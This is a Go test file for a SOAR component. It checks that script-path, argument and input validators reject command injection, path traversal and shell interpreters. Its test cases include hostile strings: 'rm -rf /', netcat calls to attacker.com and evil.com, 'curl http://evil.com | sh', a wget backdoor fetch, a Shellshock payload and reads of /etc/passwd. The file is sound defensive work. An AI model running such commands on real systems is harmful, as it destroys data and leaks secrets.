package soar

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// REQUIREMENT: AFFIRMATIONS.md - Command Injection Prevention
// REQUIREMENT: docs/requirements/security-threat-model.md FR-SEC-005 (Command Injection)
// CRITICAL: Test that SOAR actions properly validate and escape user input to prevent command injection

// TestValidateScriptPath_BlocksShellMetacharacters tests basic shell metacharacter rejection
func TestValidateScriptPath_BlocksShellMetacharacters(t *testing.T) {
	// REQUIREMENT: Script paths must reject shell metacharacters
	// SECURITY: Prevents command injection via script path parameter

	testCases := []struct {
		name      string
		path      string
		dangerous rune
		reason    string
	}{
		{
			name:      "Semicolon",
			path:      "script.sh; rm -rf /",
			dangerous: ';',
			reason:    "Semicolon allows command chaining",
		},
		{
			name:      "Pipe",
			path:      "script.sh | nc attacker.com 1234",
			dangerous: '|',
			reason:    "Pipe redirects output to another command",
		},
		{
			name:      "Ampersand",
			path:      "script.sh && cat /etc/passwd",
			dangerous: '&',
			reason:    "Ampersand chains commands conditionally",
		},
		{
			name:      "Backtick",
			path:      "script`whoami`.sh",
			dangerous: '`',
			reason:    "Backticks execute command substitution",
		},
		{
			name:      "DollarSign",
			path:      "script$(whoami).sh",
			dangerous: '$',
			reason:    "Dollar sign enables variable expansion and command substitution",
		},
		{
			name:      "Redirect",
			path:      "script.sh > /tmp/evil",
			dangerous: '>',
			reason:    "Redirect can overwrite files",
		},
		{
			name:      "Newline",
			path:      "script.sh\nrm -rf /",
			dangerous: '\n',
			reason:    "Newline allows command injection",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// SECURITY REQUIREMENT: Shell metacharacters MUST be rejected
			err := ValidateScriptPath(tc.path)

			require.Error(t, err, "Script path with %s must be rejected: %s", tc.name, tc.path)
			assert.Contains(t, err.Error(), "prohibited",
				"Error should indicate prohibited character for: %s", tc.name)
			t.Logf("✓ BLOCKED: %s - %s", tc.path, tc.reason)
		})
	}
}

// TestValidateScriptPath_BlocksPathTraversal tests path traversal prevention
func TestValidateScriptPath_BlocksPathTraversal(t *testing.T) {
	// REQUIREMENT: Script paths must prevent path traversal
	// SECURITY: Prevents access to unintended scripts

	maliciousPaths := []struct {
		name string
		path string
	}{
		{
			name: "BasicTraversal",
			path: "../../etc/passwd",
		},
		{
			name: "EncodedDots",
			path: "..%2F..%2Fetc%2Fpasswd",
		},
		{
			name: "DotsInMiddle",
			path: "scripts/../../../etc/passwd",
		},
	}

	for _, tc := range maliciousPaths {
		t.Run(tc.name, func(t *testing.T) {
			// SECURITY REQUIREMENT: Path traversal MUST be blocked
			err := ValidateScriptPath(tc.path)

			require.Error(t, err, "Path traversal must be rejected: %s", tc.path)
			t.Logf("✓ BLOCKED path traversal: %s", tc.path)
		})
	}
}

// TestValidateScriptPath_BlocksShellCommands tests blocking of shell interpreters
func TestValidateScriptPath_BlocksShellCommands(t *testing.T) {
	// REQUIREMENT: Direct shell execution must be prohibited
	// SECURITY: Prevents attackers from invoking shells

	shellCommands := []string{
		"sh",
		"bash",
		"/bin/sh",
		"/bin/bash",
		"cmd.exe",
		"powershell.exe",
	}

	for _, shell := range shellCommands {
		t.Run(shell, func(t *testing.T) {
			// SECURITY REQUIREMENT: Shell commands MUST be rejected
			err := ValidateScriptPath(shell)

			require.Error(t, err, "Shell command must be rejected: %s", shell)
			assert.Contains(t, err.Error(), "prohibited",
				"Error should indicate prohibited shell command: %s", shell)
			t.Logf("✓ BLOCKED shell command: %s", shell)
		})
	}
}

// TestValidateScriptPath_AllowsSafePaths tests that legitimate paths are allowed
func TestValidateScriptPath_AllowsSafePaths(t *testing.T) {
	// REQUIREMENT: Validation must allow legitimate scripts
	// SECURITY: Prevent false positives

	safePaths := []string{
		"script.sh",
		"scripts/alert_handler.sh",
		"/usr/local/bin/process_alert",
		"automation/notify_team.py",
	}

	for _, path := range safePaths {
		t.Run(path, func(t *testing.T) {
			err := ValidateScriptPath(path)

			assert.NoError(t, err, "Safe path should be allowed: %s", path)
			t.Logf("✓ ALLOWED safe path: %s", path)
		})
	}
}

// TestValidateScriptArguments_BlocksShellMetacharacters tests argument validation
func TestValidateScriptArguments_BlocksShellMetacharacters(t *testing.T) {
	// REQUIREMENT: Script arguments must reject shell metacharacters
	// SECURITY: Prevents command injection through arguments

	dangerousArgs := []struct {
		name string
		args []string
	}{
		{
			name: "Semicolon",
			args: []string{"arg1; rm -rf /"},
		},
		{
			name: "Pipe",
			args: []string{"data | nc attacker.com 1234"},
		},
		{
			name: "CommandSubstitution",
			args: []string{"$(whoami)"},
		},
		{
			name: "Backticks",
			args: []string{"`id`"},
		},
		{
			name: "Redirect",
			args: []string{"arg > /tmp/evil"},
		},
		{
			name: "Newline",
			args: []string{"arg1\nmalicious command"},
		},
	}

	for _, tc := range dangerousArgs {
		t.Run(tc.name, func(t *testing.T) {
			// SECURITY REQUIREMENT: Dangerous arguments MUST be rejected
			err := ValidateScriptArguments(tc.args)

			require.Error(t, err, "Dangerous argument must be rejected: %v", tc.args)
			assert.Contains(t, err.Error(), "prohibited",
				"Error should indicate prohibited character for: %s", tc.name)
			t.Logf("✓ BLOCKED dangerous argument: %v", tc.args)
		})
	}
}

// TestValidateScriptArguments_AllowsSafeArguments tests that legitimate arguments are allowed
func TestValidateScriptArguments_AllowsSafeArguments(t *testing.T) {
	// REQUIREMENT: Validation must allow legitimate arguments
	// SECURITY: Prevent false positives

	safeArgs := [][]string{
		{"alert-123"},
		{"severity:high", "source:firewall"},
		{"/var/log/alerts.log"},
		{"user@example.com"},
		{"192.168.1.1"},
	}

	for _, args := range safeArgs {
		t.Run(strings.Join(args, ","), func(t *testing.T) {
			err := ValidateScriptArguments(args)

			assert.NoError(t, err, "Safe arguments should be allowed: %v", args)
			t.Logf("✓ ALLOWED safe arguments: %v", args)
		})
	}
}

// TestValidateScriptArguments_EnforcesLengthLimits tests length validation
func TestValidateScriptArguments_EnforcesLengthLimits(t *testing.T) {
	// REQUIREMENT: Argument length limits must be enforced
	// SECURITY: Prevents buffer overflow and DoS

	// Test individual argument length limit
	veryLongArg := strings.Repeat("A", 2000) // Exceeds 1024 limit

	err := ValidateScriptArguments([]string{veryLongArg})
	require.Error(t, err, "Very long argument should be rejected")
	assert.Contains(t, err.Error(), "exceeds maximum length",
		"Error should mention length limit")
	t.Logf("✓ BLOCKED argument exceeding length limit")

	// Test argument count limit
	tooManyArgs := make([]string, 150) // Exceeds 100 limit
	for i := range tooManyArgs {
		tooManyArgs[i] = "arg"
	}

	err = ValidateScriptArguments(tooManyArgs)
	require.Error(t, err, "Too many arguments should be rejected")
	assert.Contains(t, err.Error(), "too many arguments",
		"Error should mention argument count limit")
	t.Logf("✓ BLOCKED excessive number of arguments")
}

// TestValidateScriptArguments_RejectsEmptyArguments tests empty argument handling
func TestValidateScriptArguments_RejectsEmptyArguments(t *testing.T) {
	// REQUIREMENT: Empty arguments should be rejected
	// SECURITY: Prevents potential parser confusion

	args := []string{"valid", "", "another"}

	err := ValidateScriptArguments(args)
	require.Error(t, err, "Empty argument should be rejected")
	assert.Contains(t, err.Error(), "empty",
		"Error should mention empty argument")
	t.Logf("✓ BLOCKED empty argument")
}

// TestSanitizeInput_BlocksShellMetacharacters tests general input sanitization
func TestSanitizeInput_BlocksShellMetacharacters(t *testing.T) {
	// REQUIREMENT: General input must be sanitized
	// SECURITY: Defense in depth for all string inputs

	dangerousInputs := []struct {
		name  string
		input string
	}{
		{
			name:  "CommandChaining",
			input: "value; whoami",
		},
		{
			name:  "Pipe",
			input: "data | nc evil.com 1234",
		},
		{
			name:  "CommandSubstitution",
			input: "$(curl http://evil.com)",
		},
		{
			name:  "NullByte",
			input: "safe\x00malicious",
		},
	}

	for _, tc := range dangerousInputs {
		t.Run(tc.name, func(t *testing.T) {
			// SECURITY REQUIREMENT: Dangerous input MUST be rejected
			sanitized, err := SanitizeInput(tc.input)

			require.Error(t, err, "Dangerous input must be rejected: %s", tc.input)
			assert.Empty(t, sanitized, "Sanitized output should be empty on error")
			t.Logf("✓ BLOCKED dangerous input: %s", tc.input)
		})
	}
}

// TestSanitizeInput_AllowsSafeInput tests that legitimate input is allowed
func TestSanitizeInput_AllowsSafeInput(t *testing.T) {
	// REQUIREMENT: Validation must allow legitimate input
	// SECURITY: Prevent false positives

	safeInputs := []string{
		"normal text",
		"user@example.com",
		"Alert ID: 12345",
		"Error: connection timeout",
	}

	for _, input := range safeInputs {
		t.Run(input, func(t *testing.T) {
			sanitized, err := SanitizeInput(input)

			assert.NoError(t, err, "Safe input should be allowed: %s", input)
			assert.Equal(t, input, sanitized, "Safe input should not be modified")
			t.Logf("✓ ALLOWED safe input: %s", input)
		})
	}
}

// TestSanitizeInput_EnforcesLengthLimit tests length validation
func TestSanitizeInput_EnforcesLengthLimit(t *testing.T) {
	// REQUIREMENT: Input length limits must be enforced
	// SECURITY: Prevents DoS via large inputs

	veryLongInput := strings.Repeat("A", 5000) // Exceeds 4096 limit

	sanitized, err := SanitizeInput(veryLongInput)

	require.Error(t, err, "Very long input should be rejected")
	assert.Empty(t, sanitized, "Sanitized output should be empty on error")
	assert.Contains(t, err.Error(), "exceeds maximum length",
		"Error should mention length limit")
	t.Logf("✓ BLOCKED input exceeding length limit")
}

// TestValidateShellProhibited_BlocksShellInvocation tests shell prohibition
func TestValidateShellProhibited_BlocksShellInvocation(t *testing.T) {
	// REQUIREMENT: Shell invocation must be prohibited
	// SECURITY: Prevents exec.Command(\"sh\", \"-c\", userInput)

	prohibitedShells := []string{
		"sh",
		"bash",
		"/bin/sh",
		"/bin/bash",
		"cmd.exe",
		"CMD.EXE",
		"powershell",
		"pwsh",
	}

	for _, shell := range prohibitedShells {
		t.Run(shell, func(t *testing.T) {
			// SECURITY REQUIREMENT: Shell invocation MUST be blocked
			err := ValidateShellProhibited(shell)

			require.Error(t, err, "Shell invocation must be blocked: %s", shell)
			assert.Contains(t, err.Error(), "prohibited",
				"Error should mention prohibited shell")
			assert.Contains(t, err.Error(), "SECURITY",
				"Error should mention security reason")
			t.Logf("✓ BLOCKED shell invocation: %s", shell)
		})
	}
}

// TestValidateShellProhibited_AllowsNonShellCommands tests that normal commands are allowed
func TestValidateShellProhibited_AllowsNonShellCommands(t *testing.T) {
	// REQUIREMENT: Non-shell commands must be allowed
	// SECURITY: Prevent false positives

	safeCommands := []string{
		"python3",
		"/usr/bin/curl",
		"jq",
		"grep",
		"awk",
	}

	for _, cmd := range safeCommands {
		t.Run(cmd, func(t *testing.T) {
			err := ValidateShellProhibited(cmd)

			assert.NoError(t, err, "Non-shell command should be allowed: %s", cmd)
			t.Logf("✓ ALLOWED non-shell command: %s", cmd)
		})
	}
}

// TestRealWorldCommandInjectionAttacks tests actual attack patterns
func TestRealWorldCommandInjectionAttacks(t *testing.T) {
	// REQUIREMENT: Real-world command injection attacks must be prevented
	// SECURITY: Learn from actual CVEs and attack patterns

	attacks := []struct {
		name   string
		path   string
		args   []string
		vector string
	}{
		{
			name:   "Shellshock-style",
			path:   "script.sh",
			args:   []string{"() { :; }; /bin/bash -c 'cat /etc/passwd'"},
			vector: "Bash shellshock",
		},
		{
			name:   "Command chaining via semicolon",
			path:   "process.sh",
			args:   []string{"arg1; curl http://evil.com | sh"},
			vector: "Semicolon command separator",
		},
		{
			name:   "Command substitution",
			path:   "handler.sh",
			args:   []string{"$(wget http://evil.com/backdoor)"},
			vector: "Command substitution",
		},
		{
			name:   "Pipe to shell",
			path:   "alert.sh",
			args:   []string{"data | /bin/sh"},
			vector: "Pipe to shell",
		},
	}

	for _, attack := range attacks {
		t.Run(attack.name, func(t *testing.T) {
			// Validate path
			pathErr := ValidateScriptPath(attack.path)
			// Validate arguments
			argsErr := ValidateScriptArguments(attack.args)

			// At least one validation should fail for each attack
			hasError := pathErr != nil || argsErr != nil
			assert.True(t, hasError,
				"Attack must be blocked: %s (vector: %s)", attack.name, attack.vector)

			if pathErr != nil {
				t.Logf("✓ BLOCKED at path validation: %s", attack.name)
			}
			if argsErr != nil {
				t.Logf("✓ BLOCKED at argument validation: %s", attack.name)
			}
		})
	}
}
